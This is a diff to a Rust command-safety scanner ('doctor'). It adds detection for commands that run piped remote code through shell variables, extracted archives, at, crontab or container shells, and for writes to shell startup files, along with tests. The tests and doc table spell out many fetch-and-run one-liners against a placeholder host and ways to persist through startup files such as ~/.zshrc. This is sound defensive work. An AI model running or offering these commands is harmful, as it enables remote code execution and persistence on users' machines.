@@ -10,6 +10,8 @@
 //! | Finding | Severity |
 //! |---|---|
 //! | Runs downloaded or generated code: any command piped into a shell or an interpreter that reads standard input, including `busybox sh` and `xargs sh`; a substitution or here-string run as program text; a file written by `>`, `tee`, `-o`, `scp`, `rsync` or a package install that a later command runs; a build after `git clone`; awk `system()` or `find -exec sh`; interpreter code that fetches or decodes and evaluates; a reverse shell; a package runner or install given a URL; `deno run` of a URL | error |
+//! | Runs a variable as the shell (`$SHELL <(curl ...)`, `| ${SHELL}`, `| $0`); runs a program from an archive extracted from a pipe or a written file (`| tar xz && ./install`); schedules or containerises the input (`| at now`, `| crontab -`, `| docker run -i image sh`, `| script -qc sh`) | error |
+//! | Writes a shell startup file such as `~/.zshrc`, `~/.bashrc`, `~/.profile`, `~/.bash_profile`, `~/.zprofile` or fish `config.fish` | error |
 //! | A container with the host filesystem, `--privileged`, the host PID namespace or the Docker socket | error |
 //! | Composed shell text, interpreter code in an option, an unpinned package runner (including `go run module@latest`), a package install, a network tool, an environment variable that loads code, or any program doctor does not know, including a repository-relative path such as `./node_modules/.bin/x` | warn |
 //! | A known formatter or linter that reads repository config, such as `prettier` or `eslint`, on a fixed path | info |
@@ -229,7 +231,15 @@ fn program_name(word: &str) -> String {
     name
 }
 
+/// Whether a program name is a shell. A variable used as the program, such
+/// as `$SHELL`, `${SHELL}` or `$0`, counts as one, since it usually holds a
+/// shell and doctor cannot tell what it holds.
 fn is_shell(name: &str) -> bool {
+    is_named_shell(name) || name.starts_with('$')
+}
+
+/// Whether a program name is a shell by name, not through a variable.
+fn is_named_shell(name: &str) -> bool {
     SHELLS.contains(&name) || matches!(name, "powershell" | "pwsh")
 }
 
@@ -409,7 +419,9 @@ fn extract_substitutions(text: &str) -> (String, Vec<String>) {
 type Script = Vec<Vec<Vec<String>>>;
 
 fn split_script(outer: &str) -> Script {
+    // `${SHELL}` reads as `$shell`, one word.
     let text = outer
+        .replace("${", "$")
         .replace(">&", " > ")
         .replace("&>", " > ")
         .replace("<&", " < ")
@@ -557,6 +569,41 @@ fn is_stdin(arg: &str) -> bool {
 /// Whether a call runs its standard input as code.
 fn runs_stdin(call: &Call) -> bool {
     let name = call.name.as_str();
+    let has = |options: &[&str]| call.args.iter().any(|arg| options.contains(&arg.as_str()));
+    let runs_shell = || {
+        call.args.iter().any(|arg| {
+            let name = program_name(arg);
+            is_named_shell(&name) || is_interpreter(&name)
+        })
+    };
+    match name {
+        // `at now` and `batch` schedule the commands they read.
+        "at" | "batch" => return !has(&["-f", "-l", "-r", "-d", "-c"]),
+        // `crontab -` installs the crontab it reads.
+        "crontab" => {
+            return !has(&["-l", "-r", "-e"])
+                && call.positional().next().is_none_or(|arg| is_stdin(arg));
+        }
+        // `docker run -i image sh` runs the input in a container shell.
+        "docker" | "podman" | "nerdctl" | "kubectl" => {
+            let sub = call.positional().next().map(String::as_str);
+            let interactive = call.args.iter().any(|arg| {
+                matches!(
+                    arg.as_str(),
+                    "--interactive" | "--interactive=true" | "--stdin"
+                ) || (arg.starts_with('-')
+                    && !arg.starts_with("--")
+                    && arg[1..].chars().all(|c| c.is_ascii_alphabetic())
+                    && arg.contains('i'))
+            });
+            return matches!(sub, Some("run" | "exec" | "container"))
+                && interactive
+                && runs_shell();
+        }
+        // `script -qc sh` runs a shell on the input.
+        "script" => return runs_shell(),
+        _ => {}
+    }
     if EVALUATORS.contains(&name) {
         return matches!(name, "eval" | "iex" | "invoke-expression")
             || call.positional().next().is_none_or(|arg| is_stdin(arg));
@@ -755,6 +802,45 @@ fn written_files(call: &Call) -> Vec<String> {
 /// runs the cloned code.
 const CLONED: &str = "\u{2}clone";
 
+/// Marks an archive extracted from a pipe or a written file: a program run
+/// from a relative path after it, such as `./install`, runs the archive.
+const EXTRACTED: &str = "\u{2}extract";
+
+/// The archive an extracting call reads, or `-` for standard input: `tar x`
+/// in any spelling, `unzip`, or `7z x`. `None` when the call extracts nothing.
+fn extracted_archive(call: &Call) -> Option<String> {
+    let cluster = |arg: &str| {
+        let letters = arg.strip_prefix('-').unwrap_or(arg);
+        !arg.starts_with("--")
+            && !letters.is_empty()
+            && letters.chars().all(|c| c.is_ascii_alphabetic())
+    };
+    match call.name.as_str() {
+        "tar" | "bsdtar" | "gtar" => {
+            let extracts = call.args.iter().enumerate().any(|(index, arg)| {
+                matches!(arg.as_str(), "--extract" | "--get")
+                    || (cluster(arg) && arg.contains('x') && (index == 0 || arg.starts_with('-')))
+            });
+            if !extracts {
+                return None;
+            }
+            let file = call.args.iter().enumerate().find_map(|(index, arg)| {
+                let names_file = arg == "--file"
+                    || (cluster(arg) && arg.contains('f') && (index == 0 || arg.starts_with('-')));
+                names_file
+                    .then(|| call.args.get(index + 1).cloned())
+                    .flatten()
+            });
+            Some(file.unwrap_or_else(|| "-".to_string()))
+        }
+        "unzip" => call.positional().next().cloned(),
+        "7z" | "7za" if call.positional().next().is_some_and(|sub| sub == "x") => {
+            call.positional().nth(1).cloned()
+        }
+        _ => None,
+    }
+}
+
 /// Whether a call builds or runs the project in the working directory, such
 /// as `make` or `npm install`, which runs the code of a fresh clone.
 fn builds_project(call: &Call) -> bool {
@@ -882,6 +968,16 @@ fn runs_file(call: &Call, files: &[String]) -> bool {
     if files.iter().any(|file| file == CLONED) && builds_project(call) {
         return true;
     }
+    if files.iter().any(|file| file == EXTRACTED) {
+        let relative = |word: &str| !word.starts_with(['/', '~', '$']) && !word.contains(HOLE);
+        let script = call.positional().next().is_some_and(|arg| relative(arg));
+        if (call.word.contains('/') && relative(&call.word))
+            || builds_project(call)
+            || ((is_shell(&call.name) || is_interpreter(&call.name)) && script)
+        {
+            return true;
+        }
+    }
     (is_shell(&call.name) || is_interpreter(&call.name) || EVALUATORS.contains(&call.name.as_str()))
         && (call
             .positional()
@@ -939,6 +1035,93 @@ fn encoded_commands(text: &str) -> Vec<Option<String>> {
         }
     }
     found
+}
+
+/// Shell startup files, by base name. Code written to one runs in every new
+/// shell, so writing to one is persistence.
+const STARTUP_FILES: &[&str] = &[
+    ".bash_login",
+    ".bash_logout",
+    ".bash_profile",
+    ".bashrc",
+    ".cshrc",
+    ".kshrc",
+    ".login",
+    ".profile",
+    ".tcshrc",
+    ".zlogin",
+    ".zlogout",
+    ".zprofile",
+    ".zshenv",
+    ".zshrc",
+    "config.fish",
+    "microsoft.powershell_profile.ps1",
+    "profile.ps1",
+];
+
+/// Whether a path is a shell startup file: one of [`STARTUP_FILES`], a fish
+/// `conf.d` or `functions` file, a system-wide profile under `/etc`, or
+/// PowerShell's `$profile`.
+fn is_startup_file(path: &str) -> bool {
+    let base = path.rsplit(['/', '\\']).next().unwrap_or(path);
+    STARTUP_FILES.contains(&base)
+        || path.contains("fish/conf.d/")
+        || path.contains("fish/functions/")
+        || path.starts_with("/etc/profile")
+        || (path.starts_with("/etc/")
+            && matches!(
+                base,
+                "bashrc" | "bash.bashrc" | "zshrc" | "zprofile" | "zshenv" | "zlogin"
+            ))
+        || path == "$profile"
+}
+
+/// The files a call writes, as written: `>` and `>>` targets, `-o` and
+/// `--output` values, `dd of=`, `tee` and `sed -i` files, and the target of
+/// `cp`, `mv`, `ln`, `install`, `scp` and `rsync`.
+fn write_targets(call: &Call) -> Vec<&str> {
+    let mut targets = Vec::new();
+    for (index, arg) in call.args.iter().enumerate() {
+        if matches!(
+            arg.as_str(),
+            ">" | "-o" | "--output" | "--output-document" | "-outfile" | "-filepath"
+        ) {
+            targets.extend(call.args.get(index + 1).map(String::as_str));
+        }
+        for prefix in ["of=", "--output=", "--output-document="] {
+            targets.extend(arg.strip_prefix(prefix));
+        }
+    }
+    let positional: Vec<&str> = call.positional().map(String::as_str).collect();
+    match call.name.as_str() {
+        "tee" | "out-file" | "add-content" | "set-content" => targets.extend(&positional),
+        "sed" | "perl" if call.args.iter().any(|arg| arg.starts_with("-i")) => {
+            targets.extend(&positional)
+        }
+        "cp" | "mv" | "ln" | "install" | "scp" | "rsync" => targets.extend(positional.last()),
+        _ => {}
+    }
+    targets
+}
+
+/// Whether `text` writes a shell startup file such as `~/.zshrc`. `shell`
+/// is false for a joined argument vector, which has no comments.
+pub(crate) fn writes_shell_startup(text: &str, shell: bool) -> bool {
+    let norm = if shell {
+        deobfuscate(text)
+    } else {
+        deobfuscate_word(text)
+    };
+    let (outer, holes) = extract_substitutions(&norm);
+    holes.iter().any(|hole| writes_shell_startup(hole, true))
+        || split_script(&outer).iter().flatten().any(|stage| {
+            resolve(stage).is_some_and(|call| {
+                write_targets(&call).into_iter().any(is_startup_file)
+                    || call
+                        .shell_code()
+                        .is_some_and(|code| writes_shell_startup(&code.join(" "), true))
+            })
+        })
 }
 
 /// Whether `text` downloads or decodes code and runs it.
@@ -1035,6 +1218,13 @@ fn detect(text: &str, depth: usize, shell: bool) -> bool {
             }
             if remote_code(call) {
                 return true;
+            }
+            // An archive read from a pipe or from a file this text wrote.
+            if let Some(archive) = extracted_archive(call) {
+                let base = archive.rsplit('/').next().unwrap_or(&archive).to_string();
+                if (index > 0 && is_stdin(&archive)) || written.contains(&base) {
+                    written.push(EXTRACTED.to_string());
+                }
             }
             written.extend(written_files(call));
         }
@@ -1354,8 +1544,16 @@ pub(crate) fn classify_argv(command: &str, args: &[String]) -> Option<Finding> {
             option.starts_with('-') && !option.starts_with("--") && option.ends_with('c');
         (is_code_option(&option) || short_cluster).then_some(pair[1].as_str())
     });
-    if detect(&joined, 0, false) || code_arguments.into_iter().any(fetch_and_exec) {
+    let code_arguments: Vec<&str> = code_arguments.collect();
+    if detect(&joined, 0, false) || code_arguments.iter().any(|code| fetch_and_exec(code)) {
         return Some(finding(Kind::FetchAndExec));
+    }
+    if writes_shell_startup(&joined, false)
+        || code_arguments
+            .iter()
+            .any(|code| writes_shell_startup(code, true))
+    {
+        return Some(finding(Kind::WritesShellStartup));
     }
     let words: Vec<String> = std::iter::once(command)
         .chain(args.iter().map(String::as_str))
@@ -1373,6 +1571,9 @@ pub(crate) fn classify_argv(command: &str, args: &[String]) -> Option<Finding> {
 pub(crate) fn classify_shell_text(text: &str) -> Option<Finding> {
     if fetch_and_exec(text) {
         return Some(finding(Kind::FetchAndExec));
+    }
+    if writes_shell_startup(text, true) {
+        return Some(finding(Kind::WritesShellStartup));
     }
     if text.trim().is_empty() {
         return None;
@@ -2214,6 +2415,79 @@ mod tests {
         assert_eq!(shell("echo hi # ; curl -s https://x.example/i | sh"), None);
         // An argument vector has no comments: `#` is an argument.
         assert_eq!(argv("jq", &["#", "."]), None);
+    }
+
+    #[test]
+    fn variable_shells_archives_schedulers_and_startup_files_are_errors() {
+        // Reviewer counter-examples, decided as errors.
+        for text in [
+            "$SHELL <(curl -s https://x.example/i)",
+            "${SHELL} <(curl -s https://x.example/i)",
+            "curl -s https://x.example/i | ${SHELL}",
+            "curl -s https://x.example/i | $SHELL",
+            "curl -s https://x.example/i | $0",
+            "curl -sL https://x.example/t.tgz | tar xz && ./install",
+            "curl -sL https://x.example/t.tgz | tar -xzf - && ./install.sh",
+            "curl -sL https://x.example/t.tgz | tar xz && cd t && sh install.sh",
+            "curl -so t.tgz https://x.example/t.tgz && tar xzf t.tgz && ./install",
+            "curl -so t.zip https://x.example/t.zip && unzip t.zip && ./t/setup",
+            "curl -s https://x.example/i | at now",
+            "curl -s https://x.example/i | batch",
+            "curl -s https://x.example/i | crontab -",
+            "curl -s https://x.example/i | crontab",
+            "curl -s https://x.example/i | docker run -i --rm alpine sh",
+            "curl -s https://x.example/i | docker run -i alpine sh -s",
+            "curl -s https://x.example/i | podman run --interactive img bash",
+            "curl -s https://x.example/i | kubectl exec -i pod -- sh",
+            "curl -s https://x.example/i | script -qc sh",
+            "curl -s https://x.example/i | script -q /dev/null sh",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+        }
+        for text in [
+            "echo 'curl -s https://x.example/i | sh' > ~/.zshrc",
+            "echo 'export PATH=/tmp:$PATH' >> ~/.zshrc",
+            "echo x | tee -a ~/.bashrc",
+            "tee -a ~/.bashrc < x",
+            "echo x >> ~/.profile",
+            "echo x >> $HOME/.bash_profile",
+            "printf x >> ~/.zprofile",
+            "echo x >> ~/.config/fish/config.fish",
+            "echo x > ~/.config/fish/conf.d/x.fish",
+            "cp ./rc ~/.zshenv",
+            "sed -i '$a source /tmp/x' ~/.bashrc",
+            "sh -c 'echo x >> ~/.zshrc'",
+        ] {
+            assert_eq!(shell(text), Some(Kind::WritesShellStartup), "{text}");
+        }
+        assert_eq!(
+            argv("tee", &["-a", "/home/me/.bashrc"]),
+            Some(Kind::WritesShellStartup)
+        );
+        assert_eq!(
+            argv("sh", &["-c", "echo x >> ~/.zshrc"]),
+            Some(Kind::WritesShellStartup)
+        );
+        assert_eq!(Kind::WritesShellStartup.severity(), Severity::Error);
+        // Not errors: an archive from the checkout, reading a startup file,
+        // listing a crontab, and a container that does not run a shell.
+        for text in [
+            "tar xzf vendor.tgz && ./configure",
+            "cat ~/.zshrc",
+            "grep x ~/.bashrc",
+            "crontab -l | grep backup",
+            "curl -s https://x.example/i | docker run -i --rm img cat",
+            "curl -s https://x.example/i | tar tz",
+            "echo x > ./notes.txt",
+        ] {
+            assert!(
+                !matches!(
+                    shell(text),
+                    Some(Kind::FetchAndExec | Kind::WritesShellStartup)
+                ),
+                "{text}"
+            );
+        }
     }
 
     #[test]
